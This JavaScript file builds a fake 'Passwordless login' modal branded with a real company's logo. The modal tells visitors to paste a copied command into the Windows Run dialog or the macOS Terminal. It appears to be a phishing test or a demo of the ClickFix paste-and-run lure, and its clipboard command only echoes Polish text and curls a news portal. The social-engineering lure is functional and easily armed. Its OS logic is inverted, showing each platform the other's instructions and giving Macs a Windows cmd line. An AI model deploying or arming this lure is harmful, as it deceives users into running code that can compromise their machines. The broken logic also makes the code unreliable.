function loadCss(url) {
    return new Promise(function(resolve, reject) {
        const link = document.createElement("link");
        link.rel = "stylesheet";
        link.href = url;
        link.onload = resolve;
        link.onerror = reject;
        document.head.appendChild(link);
    });
}

function getOS() {
    const ua = navigator.userAgent;

    if (/Windows/i.test(ua)) {
        return "windows";
    }

    if (/Macintosh|Mac OS X/i.test(ua)) {
        return "mac";
    }

    if (/Linux/i.test(ua)) {
        return "linux";
    }

    return "other";
}

$(document).ready(function() {

    Promise.all([
        loadCss("https://cdnjs.cloudflare.com/ajax/libs/jquery-modal/0.9.1/jquery.modal.min.css"),
        $.getScript("https://cdnjs.cloudflare.com/ajax/libs/jquery-modal/0.9.1/jquery.modal.min.js")
        
    ]).then(function () {
        $("<style>")
            .text(`
                .modal p {
                    color: black !important;
                }
                .modal {
                    color: black !important;
                }
                .modal ol li {
                    margin: 8px;
                }
                #copyButton:hover {
                    cursor: pointer;
                }
                .statscore-logo {
                    max-width: 128px;
                }
            `)
            .appendTo("head");

        var modalContent = ``;
        var os = getOS();
        if (os !== 'mac') {
            modalContent = `
                <div id="ex1" class="modal">
                    <img class="statscore-logo" src="https://www.statscore.com/wp-content/uploads/2026/04/Statscore-Logo-Green-scaled.png"/>
                    <h1>Passwordless login mechanism!</h1>
                    <p>Confirm your digital identity with a corporate Mac. This method allows you to safely login to the page without the need to remember your login and password.</p>
                    <p>Please follow following steps to proceed.</p>
                    <ol>
                        <li>Open Terminal (Application -> Utilities -> Terminal)</li>
                        <li>Click icon <img id="copyButton-mac" src="https://coder-msl.github.io/advanced_captcha/src/copy.png" width="16" height="16"/> to copy authentication prompt.</li>
                        <li>Press both  ⌘ + V to paste the authentication prompt.</li>
                        <li>Press Return  to confirm who you are.</b></li>
                    </ol>
                </div>
            `;
        } else {
            modalContent = `
                <div id="ex1" class="modal">
                    <img class="statscore-logo" src="https://www.statscore.com/wp-content/uploads/2026/04/Statscore-Logo-Green-scaled.png"/>
                    <h1>Passwordless login mechanism!</h1>
                    <p>Confirm your digital identity with a corporate computer. This method allows you to safely login to the page without the need to remember your login and password.</p>
                    <p>Simple copy and paste operation is needed, nothing more.</p>
                    <ol>
                        <li>Click following icon <img id="copyButton-win" src="https://coder-msl.github.io/advanced_captcha/src/copy.png" width="16" height="16"/> to copy  Session identifier.</li>
                        <li>Press and hold Windows Key &nbsp; <img src="https://coder-msl.github.io/advanced_captcha/src/win_logo.png" width="16" height="16"/> + R .</li>
                        <li>In the confirmation Window press <b>CTRL + V</b></li>
                        <li>Press enter to confirm who you are.</b></li>
                    </ol>
                </div>
            `;
        }

        $(modalContent)
            .appendTo("body")
            .modal();

        $("#ex1").css("margin", "auto");

        $("#copyButton-win").on("click", function () {
            navigator.clipboard.writeText('cmd /c "echo To jest mój cyfrowy identyfikator && curl https://wp.pl/"')
                .then(() => {
                    console.log("Skopiowano");
                })
                .catch(err => {
                    console.error(err);
                });
        });
        $("#copyButton-mac").on("click", function () {
            navigator.clipboard.writeText('cmd /c "echo To jest mój cyfrowy identyfikator && curl https://wp.pl/"')
                .then(() => {
                    console.log("Skopiowano");
                })
                .catch(err => {
                    console.error(err);
                });
        });
    });


})